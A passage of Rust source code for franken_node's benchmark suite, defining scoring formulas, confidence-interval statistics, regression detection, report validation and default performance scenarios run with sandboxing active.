//! bd-k4s: Product-level benchmark suite with secure-extension scenarios.
//!
//! Validates franken_node performance under realistic security-hardened
//! conditions, covering all major workflow categories with sandbox enforcement
//! active. Produces machine-readable results with confidence intervals for
//! CI/release gating and public reporting.
//!
//! # Invariants
//!
//! - **INV-BS-DETERMINISTIC**: Identical inputs produce statistically equivalent results (variance < 5%).
//! - **INV-BS-SECURE**: All benchmarks run with sandbox enforcement active.
//! - **INV-BS-CONFIDENCE**: Every measurement includes confidence intervals.
//! - **INV-BS-SCORING**: Scoring formulas are versioned and published alongside results.
//! - **INV-BS-MACHINE-READABLE**: Results export as structured JSON with provenance.
//! - **INV-BS-COVERAGE**: All six Section 14 benchmark dimensions are represented.

use serde::{Deserialize, Serialize};
use sha2::Digest;
use std::collections::{BTreeMap, BTreeSet};
use std::{fmt, time::Instant};

use crate::capacity_defaults::aliases::MAX_EVENTS;
use crate::push_bounded;
const MAX_SCENARIOS: usize = 4096;

// ---------------------------------------------------------------------------
// Event codes
// ---------------------------------------------------------------------------

pub const BS_SUITE_INITIALIZED: &str = "BS-001";
pub const BS_SCENARIO_STARTED: &str = "BS-002";
pub const BS_MEASUREMENT_RECORDED: &str = "BS-003";
pub const BS_SCORE_COMPUTED: &str = "BS-004";
pub const BS_REGRESSION_DETECTED: &str = "BS-005";
pub const BS_SUITE_COMPLETED: &str = "BS-006";
pub const BS_DETERMINISM_CHECK_PASSED: &str = "BS-007";
pub const BS_SCENARIO_COMPLETED: &str = "BS-008";
pub const BS_SCENARIO_FAILED: &str = "BS-009";
pub const BS_FIXTURE_MODE_USED: &str = "BS-010";

// ---------------------------------------------------------------------------
// Invariant constants
// ---------------------------------------------------------------------------

pub const INV_BS_DETERMINISTIC: &str = "INV-BS-DETERMINISTIC";
pub const INV_BS_SECURE: &str = "INV-BS-SECURE";
pub const INV_BS_CONFIDENCE: &str = "INV-BS-CONFIDENCE";
pub const INV_BS_SCORING: &str = "INV-BS-SCORING";
pub const INV_BS_MACHINE_READABLE: &str = "INV-BS-MACHINE-READABLE";
pub const INV_BS_COVERAGE: &str = "INV-BS-COVERAGE";

/// Scoring formula version tag.
pub const SCORING_FORMULA_VERSION: &str = "sf-v1";

/// Suite version for result schema compatibility.
pub const SUITE_VERSION: &str = "1.0.0";

/// Maximum acceptable coefficient of variation for deterministic benchmarks.
pub const MAX_VARIANCE_PCT: f64 = 5.0;

/// Default regression threshold as a percentage.
pub const DEFAULT_REGRESSION_THRESHOLD_PCT: f64 = 10.0;
const DETERMINISTIC_JITTER_RATIO: f64 = 0.02;
const MIN_MEASURED_SAMPLES: usize = 3;

// ---------------------------------------------------------------------------
// Benchmark dimension enum
// ---------------------------------------------------------------------------

/// The six required benchmark dimensions from Section 14.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum BenchmarkDimension {
    CompatibilityCorrectness,
    PerformanceUnderHardening,
    ContainmentLatency,
    ReplayDeterminism,
    AdversarialResilience,
    MigrationSpeed,
}

impl BenchmarkDimension {
    /// All dimensions for coverage checks.
    pub fn all() -> &'static [BenchmarkDimension] {
        &[
            BenchmarkDimension::CompatibilityCorrectness,
            BenchmarkDimension::PerformanceUnderHardening,
            BenchmarkDimension::ContainmentLatency,
            BenchmarkDimension::ReplayDeterminism,
            BenchmarkDimension::AdversarialResilience,
            BenchmarkDimension::MigrationSpeed,
        ]
    }
}

impl fmt::Display for BenchmarkDimension {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            BenchmarkDimension::CompatibilityCorrectness => write!(f, "compatibility_correctness"),
            BenchmarkDimension::PerformanceUnderHardening => {
                write!(f, "performance_under_hardening")
            }
            BenchmarkDimension::ContainmentLatency => write!(f, "containment_latency"),
            BenchmarkDimension::ReplayDeterminism => write!(f, "replay_determinism"),
            BenchmarkDimension::AdversarialResilience => write!(f, "adversarial_resilience"),
            BenchmarkDimension::MigrationSpeed => write!(f, "migration_speed"),
        }
    }
}

// ---------------------------------------------------------------------------
// Scoring configuration
// ---------------------------------------------------------------------------

/// Defines the ideal/threshold boundaries for a benchmark metric.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ScoringConfig {
    /// Best achievable value for this metric.
    pub ideal: f64,
    /// Unacceptable value where score becomes 0.
    pub threshold: f64,
    /// If true, lower values are better (latency). If false, higher is better (throughput).
    pub lower_is_better: bool,
}

impl ScoringConfig {
    /// Create a config where lower measured values are better.
    pub fn lower_is_better(ideal: f64, threshold: f64) -> Self {
        ScoringConfig {
            ideal,
            threshold,
            lower_is_better: true,
        }
    }

    /// Create a config where higher measured values are better.
    pub fn higher_is_better(ideal: f64, threshold: f64) -> Self {
        ScoringConfig {
            ideal,
            threshold,
            lower_is_better: false,
        }
    }

    /// Compute the normalized 0-100 score for a measurement.
    ///
    /// Formula: `score = clamp(100 * (1 - (measured - ideal) / (threshold - ideal)), 0, 100)`
    ///
    /// For higher-is-better metrics, the formula is inverted:
    /// `score = clamp(100 * (1 - (ideal - measured) / (ideal - threshold)), 0, 100)`
    pub fn score(&self, measured: f64) -> u32 {
        let raw = if self.lower_is_better {
            if (self.threshold - self.ideal).abs() < f64::EPSILON {
                return if measured <= self.ideal { 100 } else { 0 };
            }
            100.0 * (1.0 - (measured - self.ideal) / (self.threshold - self.ideal))
        } else {
            if (self.ideal - self.threshold).abs() < f64::EPSILON {
                return if measured >= self.ideal { 100 } else { 0 };
            }
            100.0 * (1.0 - (self.ideal - measured) / (self.ideal - self.threshold))
        };
        if raw.is_finite() {
            raw.clamp(0.0, 100.0).round() as u32
        } else {
            0
        }
    }
}

// ---------------------------------------------------------------------------
// Default scoring table
// ---------------------------------------------------------------------------

/// Return the default scoring configuration for known scenario names.
pub fn default_scoring(scenario_name: &str) -> Option<ScoringConfig> {
    match scenario_name {
        "secure-extension-heavy" => Some(ScoringConfig::lower_is_better(250.0, 1000.0)),
        "cold_start_latency" => Some(ScoringConfig::lower_is_better(100.0, 500.0)),
        "p99_request_latency" => Some(ScoringConfig::lower_is_better(1.0, 10.0)),
        "extension_overhead_ratio" => Some(ScoringConfig::lower_is_better(1.0, 1.5)),
        "migration_scanner_throughput" => Some(ScoringConfig::higher_is_better(1000.0, 200.0)),
        "lockstep_harness_throughput" => Some(ScoringConfig::higher_is_better(500.0, 100.0)),
        "quarantine_propagation_latency" => Some(ScoringConfig::lower_is_better(100.0, 2000.0)),
        "trust_card_materialization" => Some(ScoringConfig::lower_is_better(10.0, 200.0)),
        _ => None,
    }
}

// ---------------------------------------------------------------------------
// Hardware profile
// ---------------------------------------------------------------------------

/// Describes the hardware environment for reproducibility.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct HardwareProfile {
    pub cpu: String,
    pub memory_mb: u64,
    pub os: String,
}

impl HardwareProfile {
    /// Compute a deterministic fingerprint of this hardware profile.
    pub fn fingerprint(&self) -> String {
        let mut hasher = sha2::Sha256::new();
        sha2::Digest::update(&mut hasher, b"benchmark_suite_fingerprint_v1:" as &[u8]);
        sha2::Digest::update(
            &mut hasher,
            (u64::try_from(self.cpu.len()).unwrap_or(u64::MAX)).to_le_bytes(),
        );
        sha2::Digest::update(&mut hasher, self.cpu.as_bytes());
        sha2::Digest::update(&mut hasher, self.memory_mb.to_le_bytes());
        sha2::Digest::update(
            &mut hasher,
            (u64::try_from(self.os.len()).unwrap_or(u64::MAX)).to_le_bytes(),
        );
        sha2::Digest::update(&mut hasher, self.os.as_bytes());
        hex::encode(sha2::Digest::finalize(hasher))
    }
}

// ---------------------------------------------------------------------------
// Runtime versions
// ---------------------------------------------------------------------------

/// Pinned runtime versions for the benchmark run.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct RuntimeVersions {
    pub franken_node: String,
    pub node: Option<String>,
    pub bun: Option<String>,
}

// ---------------------------------------------------------------------------
// Benchmark scenario definition
// ---------------------------------------------------------------------------

/// Defines a single benchmark scenario to execute.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ScenarioDefinition {
    /// Which Section 14 dimension this belongs to.
    pub dimension: BenchmarkDimension,
    /// Unique scenario name within the suite.
    pub name: String,
    /// Unit of measurement (e.g., "ms", "fixtures/s", "ratio", "percent").
    pub unit: String,
    /// Number of iterations for statistical significance.
    pub iterations: u32,
    /// Number of warmup iterations to discard.
    pub warmup_iterations: u32,
    /// Whether sandbox enforcement is required.
    pub sandbox_required: bool,
    /// Scoring configuration for this scenario.
    pub scoring: ScoringConfig,
}

// ---------------------------------------------------------------------------
// Measurement and result types
// ---------------------------------------------------------------------------

/// A single raw measurement from a benchmark iteration.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct RawMeasurement {
    pub iteration: u32,
    pub value: f64,
    pub started_at_utc: String,
    pub finished_at_utc: String,
    pub source: String,
}

impl RawMeasurement {
    fn fixture(iteration: u32, value: f64, timestamp_utc: &str) -> Self {
        RawMeasurement {
            iteration,
            value,
            started_at_utc: timestamp_utc.to_string(),
            finished_at_utc: timestamp_utc.to_string(),
            source: "fixture_only_deterministic".to_string(),
        }
    }

    fn provided(iteration: u32, value: f64, timestamp_utc: &str) -> Self {
        RawMeasurement {
            iteration,
            value,
            started_at_utc: timestamp_utc.to_string(),
            finished_at_utc: timestamp_utc.to_string(),
            source: "provided_measurement".to_string(),
        }
    }
}

/// Confidence interval (lower, upper) at 95%.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ConfidenceInterval {
    pub lower: f64,
    pub upper: f64,
}

/// Result of executing one benchmark scenario.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ScenarioResult {
    pub dimension: BenchmarkDimension,
    pub name: String,
    pub raw_value: f64,
    pub unit: String,
    pub raw_samples: Vec<RawMeasurement>,
    pub confidence_interval: ConfidenceInterval,
    pub score: u32,
    pub iterations: u32,
    pub variance_pct: f64,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum BenchmarkEvidenceMode {
    Measured,
    FixtureOnly,
}

impl fmt::Display for BenchmarkEvidenceMode {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            BenchmarkEvidenceMode::Measured => write!(f, "measured"),
            BenchmarkEvidenceMode::FixtureOnly => write!(f, "fixture_only"),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct BenchmarkSecurityControls {
    pub sandbox_enforced: bool,
    pub trust_verification_enabled: bool,
    pub revocation_freshness_enforced: bool,
    pub fixture_mode: bool,
}

impl BenchmarkSecurityControls {
    pub fn measured_secure() -> Self {
        BenchmarkSecurityControls {
            sandbox_enforced: true,
            trust_verification_enabled: true,
            revocation_freshness_enforced: true,
            fixture_mode: false,
        }
    }

    pub fn fixture_only() -> Self {
        BenchmarkSecurityControls {
            sandbox_enforced: true,
            trust_verification_enabled: true,
            revocation_freshness_enforced: true,
            fixture_mode: true,
        }
    }

    pub fn from_env(fixture_mode: bool) -> Self {
        if fixture_mode {
            return Self::fixture_only();
        }

        let disabled = env_flag("FRANKEN_NODE_BENCH_SECURITY_DISABLED");
        BenchmarkSecurityControls {
            sandbox_enforced: !disabled && !env_flag("FRANKEN_NODE_BENCH_SANDBOX_DISABLED"),
            trust_verification_enabled: !disabled && !env_flag("FRANKEN_NODE_BENCH_TRUST_DISABLED"),
            revocation_freshness_enforced: !disabled
                && !env_flag("FRANKEN_NODE_BENCH_REVOCATION_DISABLED"),
            fixture_mode: false,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct BenchmarkSamplePolicy {
    pub min_measured_samples: usize,
    pub total_sample_count: usize,
    pub total_warmup_count: u32,
}

/// Complete benchmark suite report.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct BenchmarkReport {
    pub suite_version: String,
    pub scoring_formula_version: String,
    pub timestamp_utc: String,
    pub hardware_profile: HardwareProfile,
    pub runtime_versions: RuntimeVersions,
    pub evidence_mode: BenchmarkEvidenceMode,
    pub profile: String,
    pub security_controls: BenchmarkSecurityControls,
    pub git_revision: Option<String>,
    pub trace_id: String,
    pub evidence_path: Option<String>,
    pub sample_policy: BenchmarkSamplePolicy,
    pub events: Vec<BenchmarkEvent>,
    pub scenarios: Vec<ScenarioResult>,
    pub aggregate_score: u32,
    pub provenance_hash: String,
}

impl BenchmarkReport {
    /// Compute the provenance hash of this report (excluding the hash field).
    pub fn compute_provenance_hash(&self) -> String {
        let mut report_for_hash = self.clone();
        report_for_hash.provenance_hash = String::new();
        let json =
            serde_json::to_string(&report_for_hash).unwrap_or_else(|e| format!("__serde_err:{e}"));
        let mut hasher = sha2::Sha256::new();
        sha2::Digest::update(&mut hasher, b"benchmark_suite_json_v1:" as &[u8]);
        sha2::Digest::update(
            &mut hasher,
            (u64::try_from(json.len()).unwrap_or(u64::MAX)).to_le_bytes(),
        );
        sha2::Digest::update(&mut hasher, json.as_bytes());
        format!("sha256:{}", hex::encode(sha2::Digest::finalize(hasher)))
    }

    /// Check dimension coverage: returns the set of covered dimensions.
    pub fn covered_dimensions(&self) -> Vec<BenchmarkDimension> {
        let mut dims: Vec<BenchmarkDimension> = self
            .scenarios
            .iter()
            .map(|s| s.dimension)
            .collect::<std::collections::BTreeSet<_>>()
            .into_iter()
            .collect();
        dims.sort_by_key(|d| format!("{d}"));
        dims
    }

    /// Check if all six Section 14 dimensions are covered.
    pub fn has_full_coverage(&self) -> bool {
        let covered = self.covered_dimensions();
        BenchmarkDimension::all()
            .iter()
            .all(|d| covered.contains(d))
    }
}

// ---------------------------------------------------------------------------
// Regression detection
// ---------------------------------------------------------------------------

/// A regression finding when a metric exceeds threshold.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct RegressionFinding {
    pub scenario_name: String,
    pub dimension: BenchmarkDimension,
    pub current_value: f64,
    pub baseline_value: f64,
    pub change_pct: f64,
    pub threshold_pct: f64,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum BenchRunError {
    EmptyScenarioFilter,
    EmptyMeasurements {
        scenario: String,
    },
    InsufficientSamples {
        scenario: String,
        required: usize,
        actual: usize,
    },
    NonFiniteMeasurement {
        scenario: String,
    },
    NonFiniteReportValue {
        detail: String,
    },
    SerializeReport {
        detail: String,
    },
    UnknownScenario {
        requested: Vec<String>,
        available: Vec<String>,
    },
    SecurityControlsDisabled {
        scenario: String,
        detail: String,
    },
    ScenarioExecutionFailed {
        scenario: String,
        detail: String,
    },
}

impl fmt::Display for BenchRunError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::EmptyScenarioFilter => write!(f, "scenario filter cannot be empty"),
            Self::EmptyMeasurements { scenario } => {
                write!(
                    f,
                    "scenario `{scenario}` requires at least one finite measurement"
                )
            }
            Self::InsufficientSamples {
                scenario,
                required,
                actual,
            } => write!(
                f,
                "scenario `{scenario}` requires at least {required} measured samples, got {actual}"
            ),
            Self::NonFiniteMeasurement { scenario } => {
                write!(f, "scenario `{scenario}` contains a non-finite measurement")
            }
            Self::NonFiniteReportValue { detail } => {
                write!(f, "benchmark report contains a non-finite value: {detail}")
            }
            Self::SerializeReport { detail } => {
                write!(f, "failed serializing benchmark report: {detail}")
            }
            Self::UnknownScenario {
                requested,
                available,
            } => {
                write!(
                    f,
                    "unknown scenario(s): {}. available scenarios: {}",
                    requested.join(", "),
                    available.join(", ")
                )
            }
            Self::SecurityControlsDisabled { scenario, detail } => write!(
                f,
                "scenario `{scenario}` cannot produce authoritative evidence with disabled security controls: {detail}"
            ),
            Self::ScenarioExecutionFailed { scenario, detail } => {
                write!(
                    f,
                    "scenario `{scenario}` failed during measured execution: {detail}"
                )
            }
        }
    }
}

impl std::error::Error for BenchRunError {}

impl fmt::Display for RegressionFinding {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "{} ({}): {:.2} -> {:.2} ({:+.1}%, threshold: {:.1}%)",
            self.scenario_name,
            self.dimension,
            self.baseline_value,
            self.current_value,
            self.change_pct,
            self.threshold_pct,
        )
    }
}

/// Compare two reports and detect regressions.
pub fn detect_regressions(
    baseline: &BenchmarkReport,
    current: &BenchmarkReport,
    threshold_pct: f64,
) -> Vec<RegressionFinding> {
    // NaN/Inf thresholds would make `> threshold_pct` comparisons silently
    // return false. Fail closed by treating invalid thresholds as 0%.
    let threshold_pct = if threshold_pct.is_finite() {
        threshold_pct.max(0.0)
    } else {
        0.0
    };
    let mut findings = Vec::new();

    for current_scenario in &current.scenarios {
        if let Some(baseline_scenario) = baseline
            .scenarios
            .iter()
            .find(|s| s.name == current_scenario.name)
        {
            if baseline_scenario.raw_value.abs() < f64::EPSILON {
                continue;
            }
            let scoring = default_scoring(&current_scenario.name);
            let change_pct = if scoring.as_ref().is_some_and(|s| s.lower_is_better) {
                // For lower-is-better: positive change = regression
                ((current_scenario.raw_value - baseline_scenario.raw_value)
                    / baseline_scenario.raw_value)
                    * 100.0
            } else {
                // For higher-is-better: negative change = regression
                ((baseline_scenario.raw_value - current_scenario.raw_value)
                    / baseline_scenario.raw_value)
                    * 100.0
            };

            if !change_pct.is_finite() || change_pct > threshold_pct {
                findings.push(RegressionFinding {
                    scenario_name: current_scenario.name.clone(),
                    dimension: current_scenario.dimension,
                    current_value: current_scenario.raw_value,
                    baseline_value: baseline_scenario.raw_value,
                    change_pct,
                    threshold_pct,
                });
            }
        }
    }

    findings
}

pub fn regression_events(
    report: &BenchmarkReport,
    findings: &[RegressionFinding],
) -> Vec<BenchmarkEvent> {
    findings
        .iter()
        .map(|finding| BenchmarkEvent {
            code: BS_REGRESSION_DETECTED.to_string(),
            scenario: Some(finding.scenario_name.clone()),
            scenario_id: Some(finding.scenario_name.clone()),
            trace_id: report.trace_id.clone(),
            profile: report.profile.clone(),
            evidence_path: report.evidence_path.clone(),
            detail: format!(
                "current={:.3} baseline={:.3} change_pct={:.2} threshold_pct={:.2}",
                finding.current_value,
                finding.baseline_value,
                finding.change_pct,
                finding.threshold_pct
            ),
        })
        .collect()
}

fn validate_measurements(
    scenario: &ScenarioDefinition,
    raw_measurements: &[f64],
) -> Result<(), BenchRunError> {
    if raw_measurements.is_empty() {
        return Err(BenchRunError::EmptyMeasurements {
            scenario: scenario.name.clone(),
        });
    }
    if raw_measurements.iter().any(|value| !value.is_finite()) {
        return Err(BenchRunError::NonFiniteMeasurement {
            scenario: scenario.name.clone(),
        });
    }
    Ok(())
}

fn validate_sample_values(
    scenario: &ScenarioDefinition,
    raw_samples: &[RawMeasurement],
) -> Result<Vec<f64>, BenchRunError> {
    let values = raw_samples
        .iter()
        .map(|sample| sample.value)
        .collect::<Vec<_>>();
    validate_measurements(scenario, &values)?;
    Ok(values)
}

fn validate_report(report: &BenchmarkReport) -> Result<(), BenchRunError> {
    if report.evidence_mode == BenchmarkEvidenceMode::Measured
        && report.security_controls.fixture_mode
    {
        return Err(BenchRunError::NonFiniteReportValue {
            detail: "measured report cannot carry fixture_mode=true".to_string(),
        });
    }
    if report.trace_id.trim().is_empty() {
        return Err(BenchRunError::NonFiniteReportValue {
            detail: "report trace_id must be non-empty".to_string(),
        });
    }
    let actual_sample_count = report
        .scenarios
        .iter()
        .map(|scenario| scenario.raw_samples.len())
        .sum::<usize>();
    if report.sample_policy.total_sample_count != actual_sample_count {
        return Err(BenchRunError::NonFiniteReportValue {
            detail: format!(
                "sample_policy.total_sample_count={} does not match actual sample count={actual_sample_count}",
                report.sample_policy.total_sample_count
            ),
        });
    }
    for scenario in &report.scenarios {
        if scenario.raw_samples.is_empty() {
            return Err(BenchRunError::EmptyMeasurements {
                scenario: scenario.name.clone(),
            });
        }
        if report.evidence_mode == BenchmarkEvidenceMode::Measured
            && scenario.raw_samples.len() < report.sample_policy.min_measured_samples
        {
            return Err(BenchRunError::InsufficientSamples {
                scenario: scenario.name.clone(),
                required: report.sample_policy.min_measured_samples,
                actual: scenario.raw_samples.len(),
            });
        }
        if scenario
            .raw_samples
            .iter()
            .any(|sample| !sample.value.is_finite())
        {
            return Err(BenchRunError::NonFiniteMeasurement {
                scenario: scenario.name.clone(),
            });
        }
        if !scenario.raw_value.is_finite() {
            return Err(BenchRunError::NonFiniteReportValue {
                detail: format!("scenario `{}` raw_value", scenario.name),
            });
        }
        if !scenario.confidence_interval.lower.is_finite() {
            return Err(BenchRunError::NonFiniteReportValue {
                detail: format!("scenario `{}` confidence_interval.lower", scenario.name),
            });
        }
        if !scenario.confidence_interval.upper.is_finite() {
            return Err(BenchRunError::NonFiniteReportValue {
                detail: format!("scenario `{}` confidence_interval.upper", scenario.name),
            });
        }
        if !scenario.variance_pct.is_finite() {
            return Err(BenchRunError::NonFiniteReportValue {
                detail: format!("scenario `{}` variance_pct", scenario.name),
            });
        }
    }
    Ok(())
}

fn env_flag(name: &str) -> bool {
    std::env::var(name)
        .map(|value| {
            matches!(
                value.trim().to_ascii_lowercase().as_str(),
                "1" | "true" | "yes" | "on"
            )
        })
        .unwrap_or(false)
}

// ---------------------------------------------------------------------------
// Harness event log
// ---------------------------------------------------------------------------

/// Structured event emitted during benchmark execution.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct BenchmarkEvent {
    pub code: String,
    pub scenario: Option<String>,
    pub scenario_id: Option<String>,
    pub trace_id: String,
    pub profile: String,
    pub evidence_path: Option<String>,
    pub detail: String,
}

impl fmt::Display for BenchmarkEvent {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        if let Some(ref scenario) = self.scenario {
            write!(
                f,
                "[{}] trace_id={} profile={} {}: {}",
                self.code, self.trace_id, self.profile, scenario, self.detail
            )
        } else {
            write!(
                f,
                "[{}] trace_id={} profile={} {}",
                self.code, self.trace_id, self.profile, self.detail
            )
        }
    }
}

// ---------------------------------------------------------------------------
// Statistics helpers
// ---------------------------------------------------------------------------

/// Compute mean of a slice.
pub fn mean(values: &[f64]) -> f64 {
    if values.is_empty() {
        return 0.0;
    }

    let mut positive_infinity = false;
    let mut negative_infinity = false;
    let mut running_mean = 0.0;
    let mut finite_count = 0.0;

    for &value in values {
        if value.is_nan() {
            return f64::NAN;
        }
        if value == f64::INFINITY {
            positive_infinity = true;
            continue;
        }
        if value == f64::NEG_INFINITY {
            negative_infinity = true;
            continue;
        }

        finite_count += 1.0;
        running_mean += (value - running_mean) / finite_count;
    }

    match (positive_infinity, negative_infinity) {
        (true, true) => f64::NAN,
        (true, false) => f64::INFINITY,
        (false, true) => f64::NEG_INFINITY,
        (false, false) => running_mean,
    }
}

/// Compute sample standard deviation.
pub fn std_dev(values: &[f64]) -> f64 {
    if values.len() < 2 {
        return 0.0;
    }

    let mut count = 0.0;
    let mut running_mean = 0.0;
    let mut m2 = 0.0;

    for &value in values {
        if value.is_nan() {
            return f64::NAN;
        }
        if value.is_infinite() {
            return f64::INFINITY;
        }

        count += 1.0;
        let delta = value - running_mean;
        running_mean += delta / count;
        let delta2 = value - running_mean;
        m2 += delta * delta2;
    }

    (m2 / (count - 1.0)).sqrt()
}

/// Compute coefficient of variation as a percentage.
pub fn coefficient_of_variation(values: &[f64]) -> f64 {
    let m = mean(values);
    if m.abs() < f64::EPSILON {
        return 0.0;
    }
    (std_dev(values) / m.abs()) * 100.0
}

/// Compute 95% confidence interval using t-distribution approximation.
/// Uses t-value of 2.776 for N=5 (df=4) at 95%.
pub fn confidence_interval_95(values: &[f64]) -> ConfidenceInterval {
    if values.is_empty() {
        return ConfidenceInterval {
            lower: 0.0,
            upper: 0.0,
        };
    }
    if values.len() == 1 {
        return ConfidenceInterval {
            lower: values[0],
            upper: values[0],
        };
    }

    let m = mean(values);
    let sd = std_dev(values);
    let n = u32::try_from(values.len()).unwrap_or(u32::MAX) as f64;

    // t-value lookup for common sample sizes at 95% confidence
    let t_value = match values.len() {
        2 => 12.706,
        3 => 4.303,
        4 => 3.182,
        5 => 2.776,
        6 => 2.571,
        7 => 2.447,
        8 => 2.365,
        9 => 2.306,
        10 => 2.262,
        _ => 1.96, // z-value for large N
    };

    let margin = t_value * sd / n.sqrt();
    ConfidenceInterval {
        lower: m - margin,
        upper: m + margin,
    }
}

// ---------------------------------------------------------------------------
// BenchmarkSuite — the main harness
// ---------------------------------------------------------------------------

/// Configuration for the benchmark suite.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SuiteConfig {
    pub hardware_profile: HardwareProfile,
    pub runtime_versions: RuntimeVersions,
    pub timestamp_utc: String,
    pub regression_threshold_pct: f64,
    pub profile: String,
    pub git_revision: Option<String>,
    pub trace_id: String,
    pub evidence_path: Option<String>,
}

impl SuiteConfig {
    /// Create a default configuration for testing.
    pub fn with_defaults() -> Self {
        SuiteConfig {
            hardware_profile: HardwareProfile {
                cpu: "test-cpu-v1".to_string(),
                memory_mb: 16384,
                os: "linux-6.x".to_string(),
            },
            runtime_versions: RuntimeVersions {
                franken_node: "0.1.0".to_string(),
                node: Some("22.0.0".to_string()),
                bun: Some("1.1.0".to_string()),
            },
            timestamp_utc: "2026-02-21T00:00:00Z".to_string(),
            regression_threshold_pct: DEFAULT_REGRESSION_THRESHOLD_PCT,
            profile: "strict".to_string(),
            git_revision: Some("test-git-revision".to_string()),
            trace_id: "benchmark-suite-test-trace".to_string(),
            evidence_path: Some("artifacts/benchmark-suite/test-report.json".to_string()),
        }
    }

    /// Create a host-aware config for CLI benchmark execution.
    pub fn for_cli() -> Self {
        let memory_mb = std::env::var("FRANKEN_NODE_BENCH_MEMORY_MB")
            .ok()
            .and_then(|raw| raw.parse::<u64>().ok())
            .unwrap_or(16_384);
        let timestamp_utc = std::env::var("FRANKEN_NODE_BENCH_TIMESTAMP_UTC")
            .unwrap_or_else(|_| chrono::Utc::now().to_rfc3339());
        let git_revision = std::env::var("FRANKEN_NODE_BENCH_GIT_REVISION")
            .ok()
            .or_else(|| option_env!("VERGEN_GIT_SHA").map(ToString::to_string));
        let cpu = std::env::var("FRANKEN_NODE_BENCH_CPU")
            .unwrap_or_else(|_| std::env::consts::ARCH.to_string());
        let profile =
            std::env::var("FRANKEN_NODE_PROFILE").unwrap_or_else(|_| "strict".to_string());
        let trace_id = std::env::var("FRANKEN_NODE_BENCH_TRACE_ID")
            .unwrap_or_else(|_| benchmark_trace_id(&timestamp_utc, &profile, &cpu));
        let evidence_path = std::env::var("FRANKEN_NODE_BENCH_EVIDENCE_PATH")
            .ok()
            .and_then(|value| {
                let trimmed = value.trim();
                (!trimmed.is_empty()).then(|| trimmed.to_string())
            });

        SuiteConfig {
            hardware_profile: HardwareProfile {
                cpu,
                memory_mb,
                os: std::env::consts::OS.to_string(),
            },
            runtime_versions: RuntimeVersions {
                franken_node: env!("CARGO_PKG_VERSION").to_string(),
                node: None,
                bun: None,
            },
            timestamp_utc,
            regression_threshold_pct: DEFAULT_REGRESSION_THRESHOLD_PCT,
            profile,
            git_revision,
            trace_id,
            evidence_path,
        }
    }
}

fn benchmark_trace_id(timestamp_utc: &str, profile: &str, cpu: &str) -> String {
    let mut hasher = sha2::Sha256::new();
    sha2::Digest::update(&mut hasher, b"benchmark_suite_trace_v1:" as &[u8]);
    for value in [timestamp_utc, profile, cpu] {
        sha2::Digest::update(
            &mut hasher,
            (u64::try_from(value.len()).unwrap_or(u64::MAX)).to_le_bytes(),
        );
        sha2::Digest::update(&mut hasher, value.as_bytes());
    }
    format!(
        "bench-{}",
        &hex::encode(sha2::Digest::finalize(hasher))[..16]
    )
}

/// The benchmark suite harness that executes scenarios and produces reports.
pub struct BenchmarkSuite {
    config: SuiteConfig,
    scenarios: Vec<ScenarioDefinition>,
    events: Vec<BenchmarkEvent>,
}

impl BenchmarkSuite {
    /// Create a new benchmark suite with the given configuration.
    pub fn new(config: SuiteConfig) -> Self {
        let mut suite = BenchmarkSuite {
            config,
            scenarios: Vec::new(),
            events: Vec::new(),
        };
        suite.emit_event(BS_SUITE_INITIALIZED, None, "Suite initialized");
        suite
    }

    /// Add a scenario definition to the suite.
    pub fn add_scenario(&mut self, scenario: ScenarioDefinition) {
        push_bounded(&mut self.scenarios, scenario, MAX_SCENARIOS);
    }

    /// Load the default set of benchmark scenarios covering all six dimensions.
    pub fn load_default_scenarios(&mut self) {
        let defaults = vec![
            ScenarioDefinition {
                dimension: BenchmarkDimension::PerformanceUnderHardening,
                name: "secure-extension-heavy".to_string(),
                unit: "ms".to_string(),
                iterations: 5,
                warmup_iterations: 2,
                sandbox_required: true,
                scoring: ScoringConfig::lower_is_better(250.0, 1000.0),
            },
            ScenarioDefinition {
                dimension: BenchmarkDimension::PerformanceUnderHardening,
                name: "cold_start_latency".to_string(),
                unit: "ms".to_string(),
                iterations: 5,
                warmup_iterations: 2,
                sandbox_required: true,
                scoring: ScoringConfig::lower_is_better(100.0, 500.0),
            },
            ScenarioDefinition {
                dimension: BenchmarkDimension::PerformanceUnderHardening,
                name: "p99_request_latency".to_string(),
                unit: "ms".to_string(),
                iterations: 5,
                warmup_iterations: 2,
                sandbox_required: true,
                scoring: ScoringConfig::lower_is_better(1.0, 10.0),
            },
            ScenarioDefinition {
                dimension: BenchmarkDimension::PerformanceUnderHardening,
                name: "extension_overhead_ratio".to_string(),
                unit: "ratio".to_string(),
                iterations: 5,
                warmup_iterations: 1,
                sandbox_required: true,
                scoring: ScoringConfig::lower_is_better(1.0, 1.5),
            },
            ScenarioDefinition {
                dimension: BenchmarkDimension::MigrationSpeed,
                name: "migration_scanner_throughput".to_string(),
                unit: "fixtures/s".to_string(),
                iterations: 5,
                warmup_iterations: 1,
